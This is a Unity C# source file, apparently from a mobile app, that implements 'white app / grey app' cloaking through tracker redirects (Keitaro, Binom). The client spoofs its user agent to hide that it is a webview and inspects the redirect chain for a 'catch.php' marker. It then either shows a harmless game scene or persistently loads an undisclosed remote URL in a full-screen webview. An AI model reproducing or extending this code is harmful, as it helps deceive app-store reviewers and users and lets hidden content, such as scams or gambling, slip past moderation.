using System;
using System.Collections.Generic;
using Core;
using Octopus.SceneLoaderCore.Helpers;
using UnityEngine;
using UnityEngine.SceneManagement;
using System.Text.RegularExpressions;

namespace Octopus.Client
{
    public class Client : MonoBehaviour
    {
        public static Client Instance;
        
        public bool isIgnoreFirstRunApp;

        private List<Request> requests = new List<Request>();
        
        private UniWebView _webView;
        
        private string generatedURL;
        
        protected void Awake()
        {
            if (Instance != null)
            {
                Destroy(gameObject);
            }
            else
            {
                Instance = this;
            }
        }
        
        public void Initialize()
        {
            PrintMessage($"!!! Client -> Initialize: IsFirstRunApp={GameSettings.GetValue(Constants.IsFirstRunApp)}");
            
            if(GameSettings.HasKey(Constants.IsFirstRunApp) && !isIgnoreFirstRunApp)
            {
                PrintMessage("!!! Client - Повторно запустили додаток");
                
                if (CheckReceiveUrlIsNullOrEmpty())
                {
                    PrintMessage("!!! Client -  Стартова сторінка з Бінома є порожня, показуєм білу апку");
                    
                    SwitchToScene();
                }
                else
                {
                    PrintMessage("!!! Client - Біном не є порожній");

                    SwitchToScene();
                }
            }
            else 
            {
                PrintMessage("!!! Client - Перший раз запустили додаток");
                
                GameSettings.Init();

                OpenURL();
            }
        }

        private void Send(Request request)
        {
            PrintMessage($"Send Request {request.GetType()}");
            
            requests.Remove(request);

            StartCoroutine(SenderRequest.Send(request, CheckRequests));
        }

        private void CheckRequests()
        {
            PrintMessage("!!! Client -> CheckRequests");
            
            if (requests.Count != 0)
            {
                Send(requests[0]);
            }
            else
            {
                SwitchToScene();
            }
        }
        
        private void SwitchToScene()
        {
            PrintMessage("!!! Client -> SwitchToScene");
            
            var scene = CheckReceiveUrlIsNullOrEmpty() ? SceneLoader.Instance.mainScene : SceneLoader.Instance.webviewScene;
            
            if (SceneLoader.Instance)
                SceneLoader.Instance.SwitchToScene(scene);
            else
                SceneManager.LoadScene(scene);
        }

        private bool CheckReceiveUrlIsNullOrEmpty()
        {
            PrintMessage("!!! Client -> CheckStartUrlIsNullOrEmpty");
            
            var receiveUrl = GameSettings.GetValue(Constants.ReceiveUrl, "");

            PrintMessage($"@@@ StartUrl: {receiveUrl}");

            return String.IsNullOrEmpty(receiveUrl);
        }
        
        private void OpenURL()
        {
            GenerateURL();
            
            CheckWebview();
            
            //Subscribe();

            SetUserAgent();
            
            _webView.Load(generatedURL);
            
            _webView.OnShouldClose += (view) => false;
        }

        private void SetUserAgent()
        {
            var agent = _webView.GetUserAgent();
                
            GameSettings.SetValue(Constants.DefaultUserAgent, agent);

            PrintMessage($"💁 GetUserAgent: {agent}");
                
            agent = agent.Replace("; wv", "");
                
            agent = Regex.Replace(agent, @"Version/\d+\.\d+", "");

            PrintMessage($"💁 SetUserAgent: {agent}");
                
            _webView.SetUserAgent(agent);
        }

        private void GenerateURL()
        {
            generatedURL = $"{Settings.GetAttributionUrl()}";
            
            PrintMessage($"📌 generatedURL: {generatedURL}");
        }

        private void CheckWebview()
        {
            if (_webView == null)
            {
                CreateWebView();
            }
        }
        private int redirectCount = 0;
        private string secondRedirectUrl = null;
        private bool wasCatchDetected;
        
        private void CreateWebView()
        {
            var webViewGameObject = new GameObject("UniWebView");

            _webView = webViewGameObject.AddComponent<UniWebView>();

            _webView.RegisterShouldHandleRequest(request =>
            {
                PrintMessage($" {redirectCount} ### 👁️ RegisterShouldHandleRequest: request.Url={request.Url}");

                if (request.Url.StartsWith("about:blank"))
                    return true;

                redirectCount++;
                
                // 🔍 Перевірка першого редіректа (тобто redirectCount == 2)
                if (redirectCount == 2)
                {
                    if (request.Url.Contains("catch.php"))
                    {
                        PrintMessage($"🎯 Після 1-го редіректа посилання містить 'catch.php': {request.Url}");
                        
                        wasCatchDetected = false;
                    }
                    else
                    {
                        PrintMessage($"⚠️ Після 1-го редіректа — але БЕЗ 'catch.php': {request.Url}");
                        
                        wasCatchDetected = true;
                        
                        CheckPartApp2(wasCatchDetected);
                    }
                }
                
                // 🔍 Перевірка другого редіректа (тобто redirectCount == 3)
                if (redirectCount == 3)
                {
                    secondRedirectUrl = request.Url;
                    
                    PrintMessage($"✅ Збережено URL після 2-го редіректа: {secondRedirectUrl}");
                    
                    var uriDomen = new Uri(Settings.GetAttributionUrl());
                    
                    if (request.Url.Contains(uriDomen.Host.ToLower()))
                    {
                        PrintMessage($"⚠️ Прийшов дефолтний домен від Кейтаро: {secondRedirectUrl}");

                        wasCatchDetected = true;
                    }

                    CheckPartApp2(wasCatchDetected);

                    // ❗ Зупиняємо редірект тут
                    return false;
                }

                return true;
            });
        }
        
        private void Subscribe()
        {
            PrintMessage($"📥Subscribe");
            
            _webView.OnPageFinished += OnPageFinished;
            _webView.OnPageStarted += OnPageStarted;
            _webView.OnLoadingErrorReceived += OnLoadingErrorReceived;
        }
        
        private void UnSubscribe()
        {
            PrintMessage($"📤UnSubscribe");
            
            _webView.OnPageFinished -= OnPageFinished;
            _webView.OnPageStarted -= OnPageStarted;
            _webView.OnLoadingErrorReceived -= OnLoadingErrorReceived;
        }

        private void OnPageStarted(UniWebView webview, string url)
        {
            PrintMessage($"### 🎬OnPageStarted UniWebView: url={url} / _webView.Url={_webView.Url}");
        }
        
        private void OnPageFinished(UniWebView view, int statusCode, string url)
        {
            PrintMessage($"### 🏁OnPageFinished: url={url} / _webView.Url={_webView.Url}");

            CheckPartApp(url);

            UnSubscribe();
        }

        private void OnLoadingErrorReceived(UniWebView view, int errorCode, string errorMessage, UniWebViewNativeResultPayload payload)
        {
            PrintMessage($"### 💀OnLoadingErrorReceived: errorCode={errorCode}, _webView.Url={_webView.Url}, errorMessage={errorMessage}");
        
            GameSettings.SetValue(Constants.ReceiveUrl, _webView.Url);
            
            SceneLoader.Instance.SwitchToScene(SceneLoader.Instance.webviewScene);
            
            UnSubscribe();
        }

        private void CheckPartApp2(bool isWhiteApp)
        {
            GameSettings.SetFirstRunApp();
            
            if (isWhiteApp)
            {
                PrintMessage($"White App");

                //FirebaseInit.DeleteFcmToken();

                PlayerPrefs.GetInt(Constants.IsOnlyWhiteRunApp, 1);
                PlayerPrefs.Save();
                
                SceneLoader.Instance.SwitchToScene(SceneLoader.Instance.mainScene);
            }
            else
            {
                PrintMessage($"Grey App");
                
                GameSettings.SetValue(Constants.SecondRedirectUrl, secondRedirectUrl);
                GameSettings.SetValue(Constants.ReceiveUrl, secondRedirectUrl);
                
                SceneLoader.Instance.SwitchToScene(SceneLoader.Instance.webviewScene);
            }
        }

        private void CheckPartApp(string url)
        {
            var uriPage = new Uri(url);
            var uriDomen = new Uri(generatedURL);
            
            var hostPage = uriPage.Host.ToLower();
            var hostDomen = uriDomen.Host.ToLower();
            
            GameSettings.SetFirstRunApp();
            
            PrintMessage($"🔍 Перевірка URL: hostPage = {hostPage}, hostDomen = {hostDomen}");
            
            if (hostPage == hostDomen)
            {
                PrintMessage($"White App");

                //FirebaseInit.DeleteFcmToken();

                PlayerPrefs.GetInt(Constants.IsOnlyWhiteRunApp, 1);
                PlayerPrefs.Save();
                
                SceneLoader.Instance.SwitchToScene(SceneLoader.Instance.mainScene);
            }
            else
            {
                PrintMessage($"Grey App");
                
                GameSettings.SetValue(Constants.SecondRedirectUrl, secondRedirectUrl);
                
                SceneLoader.Instance.SwitchToScene(SceneLoader.Instance.webviewScene);
            }
        }
        
        private void PrintMessage(string message)
        {
            Debugger.Log($"@@@ Client ->: {message}", new Color(0.2f, 0.4f, 0.9f));
        }
    }
}
